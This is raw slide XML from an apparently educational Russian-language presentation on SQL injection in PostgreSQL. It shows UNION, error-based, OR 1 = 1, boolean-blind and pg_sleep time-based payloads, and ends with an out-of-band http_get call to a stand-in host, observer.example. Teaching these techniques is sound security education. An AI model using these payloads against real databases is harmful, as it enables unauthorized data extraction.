          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2486025"/>
            <a:ext cx="676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Ввод вместо id</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89EC9CA4-3943-4162-A88F-A185EDA1D78B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3000375"/>
            <a:ext cx="6762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95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UNION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username</a:t>
            </a:r>
          </a:p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users </a:t>
            </a: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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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42</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="query-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F55C8DA-886B-4E6E-AC99-0BAB552A0EA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4162425"/>
            <a:ext cx="676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Получившийся SQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D4C57BF-6284-4FFF-B486-500850E3C0BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4676775"/>
            <a:ext cx="6762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username </a:t>
            </a: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users</a:t>
            </a:r>
          </a:p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id = -</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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UNION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username </a:t>
            </a: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users</a:t>
            </a:r>
          </a:p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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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42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7" name="result-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34A58777-447A-4C45-ADFA-2D5B244F4C80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2486025"/>
            <a:ext cx="3409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Результат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49BF6E89-F960-4E5D-93F7-DDB98CB193BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8096250" y="3028950"/>
          <a:ext cx="3409950" cy="1381126"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="340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950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username</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2175" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>admin</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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explanation">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC8034D3-FEF4-49F5-84C3-AF6C5300A019}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="4762500"/>
            <a:ext cx="340995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Строки с id = -1 нет.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1950" b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Вторая выборка берёт admin из строки 42 и добавляет его в результат.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98AE8D7D-3690-40A3-9BDC-D3AEA0183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2511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B6EE79DF-D845-43E9-A30E-0AEDC7856EEE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SQLi: данные в сообщении об ошибке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1264E975-CED6-41F9-8C7A-8857560769A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 SQL подставлено выражение, которое пытается преобразовать имя из строки 17 в число.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="query-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5B27049-F39B-4FCF-B38B-5B969519BC29}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2638425"/>
            <a:ext cx="676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SQL после подстановки id</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0AB2EB4-AC51-48FE-B39C-951EA832F177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6762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username </a:t>
            </a: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users</a:t>
            </a:r>
          </a:p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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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OR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95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CAST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(</a:t>
            </a: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username </a:t>
            </a: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users</a:t>
            </a:r>
          </a:p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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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17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) </a:t>
            </a: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950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integer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5" name="error-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A5120E7-FF1D-4048-AB9E-A953B17AF6FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2638425"/>
            <a:ext cx="3409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Ошибка PostgreSQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="error">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C4A3E78-12AD-45A8-9834-3B6D27D7A4C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="3667125"/>
            <a:ext cx="34099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44747"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ERROR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 invalid input syntax</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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for type </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650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integer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"alex"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="explanation">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35B03D70-14BC-4624-A95D-9BD0FBBC17FC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191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Имя alex из users оказалось в диагностике. Утечка возникает, если приложение возвращает подробности ошибки клиенту.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Рисунок 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40110992-EBF1-4F1F-BA44-D69E06E61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2784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011B1BB0-1C46-4725-BCC3-3FB8A7EEF1A4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SQLi: изменение условия выборки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048BD19E-12E1-486D-9CBA-A7F7E6104E7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Условие OR 1 = 1 пропускает все строки исходной таблицы users.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="normal-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3EB6F4A2-5A24-4FD6-AC88-5F2A63E82B27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2562225"/>
            <a:ext cx="676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Обычный запрос</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="normal">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B2CED8B-937F-4FE9-9E7A-2DC63A688483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6762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username </a:t>
            </a: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users</a:t>
            </a:r>
          </a:p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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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17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5" name="normal-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F67F99D-50FC-41E2-8AAA-DB1F456AE8D6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676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Результат: alex</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="injected-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{015FCFC8-A025-4E73-8B4C-AAA8B2B20C2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4752975"/>
            <a:ext cx="676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SQL после подстановки id</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA10B111-F341-4CCB-B4DA-6E2F5441F5F8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6762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username </a:t>
            </a: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users</a:t>
            </a:r>
          </a:p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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="195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17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9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OR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95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95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9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8" name="result-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66F1BDBA-FB71-46B0-90B8-648A27E310B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2562225"/>
            <a:ext cx="3409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После OR 1 = 1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25B28B82-AD33-4B42-A569-1DFB20F9F793}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8096250" y="3114675"/>
          <a:ext cx="3409950" cy="2705100"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="340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950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username</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2100" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>alex</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2100" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>maria</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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2100" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F6"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>admin</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="40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05064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Рисунок 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40110992-EBF1-4F1F-BA44-D69E06E61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7371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F5D86239-D139-4908-A35E-B3E5FBD600CF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SQLi: blind по содержимому ответа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754313BF-C07F-4142-AA98-1EC9A951DBF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Проверяем первую букву имени пользователя 42. Приложение сообщает только, найдена ли строка.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="true-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{308D79E4-43C5-43E4-9987-FD66E5A61DCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2657475"/>
            <a:ext cx="5067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Буква «a»: true</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="true-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FF577A17-38D3-4F4E-98AB-326015D72652}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3267075"/>
            <a:ext cx="506730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username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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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17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AND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(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LEFT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(username, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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42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) = 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'a'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5" name="true-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{669EE622-858B-4FE8-B9D6-430AE5DC48A5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506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HTTP 200: «Найден»</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="false-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FA13267-B949-47D9-8FC5-2693B02EA49E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2657475"/>
            <a:ext cx="5067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Буква «z»: false</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="false-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A256E4A8-9169-4B42-8745-36D193F96171}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="3267075"/>
            <a:ext cx="506730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username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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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17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AND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(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LEFT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(username, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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42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) = 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'z'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8" name="false-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9371438-2A49-4DDE-88BE-F0D42C304CA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="5295900"/>
            <a:ext cx="506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HTTP 200: «Не найден»</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Рисунок 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E275EAF-163B-4B48-806A-72CBF4321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20342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74BA056F-2A88-42FB-A0CC-1E857E49109F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SQLi: blind по времени ответа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BA672E2A-3DBB-4E19-B58C-D4DE6688ACC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Проверяем ту же букву в users. При истинном условии СУБД выполняет pg_sleep(2).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="true-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F309037-B2A7-481C-AD27-1302462C6C82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2657475"/>
            <a:ext cx="5067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Буква «a»: true</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="true-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF2329EF-3BA1-40D5-BF0D-88B6B50004FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3267075"/>
            <a:ext cx="5067300" cy="1857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WHEN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(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LEFT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(username, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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42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) = 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'a'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THEN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pg_sleep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72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pg_sleep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72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END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5" name="true-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E3479C0-1C6A-4531-9E07-1A70CC04D76F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5067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Ожидаемая задержка: около 2 с</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="false-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{203A4E02-F0DC-4759-86EC-295186957817}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2657475"/>
            <a:ext cx="5067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Буква «z»: false</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="false-query">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AAF733D1-E1F6-4F85-ACF8-295CA5941A67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="3267075"/>
            <a:ext cx="5067300" cy="1857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WHEN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(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LEFT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(username, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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users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id = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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42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) = 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'z'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THEN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pg_sleep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72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pg_sleep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72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END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8" name="false-result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{277938B6-482E-4222-B287-EBB51705D888}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="5334000"/>
            <a:ext cx="5067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Без заданной задержки</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Рисунок 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E983DF57-72C5-400D-9073-13EF1D4D2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69426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5D58AE7B-5A6A-4B63-8C72-00315D83552F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lang="en-US" dirty="0"/>
              <a:t>Out-of-Band SQL Injection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0141564-267E-4D4C-B7E2-BED488A70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13" name="v7-box-238">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48629675-9E9F-49BD-A163-CDB425CDB268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7010400" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10161E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v7-text-239">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{611705D7-A7FE-4EEA-ACB4-B56C49F1E200}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="895350" y="2247900"/>
            <a:ext cx="6591300" cy="3067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-- PostgreSQL с </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty="0" err="1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расширением</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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 dirty="0" err="1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pgsql</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0" dirty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-http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status </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="180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 dirty="0" err="1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http_get</a:t>
            </a:r>
            <a:r>
              <a:rPr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'https://observer.example/seen?id=17'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15" name="v7-text-240">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DFF7098B-DC78-46AA-96B6-B8F97DDA56FA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3409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Условное наблюдение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v7-text-241">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28B84E36-C5B4-48EB-910A-C86BA2493EAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2762250"/>
            <a:ext cx="34099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/seen?id=17</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v7-text-242">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACAEEFCB-7702-4BEC-866B-3C54BB693606}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="4000500"/>
            <a:ext cx="34099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Запрос виден в журнале</a:t>
            </a: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сервиса-наблюдателя.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1875" b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Основной HTTP-ответ</a:t>
            </a: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не содержит вывод SQL.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
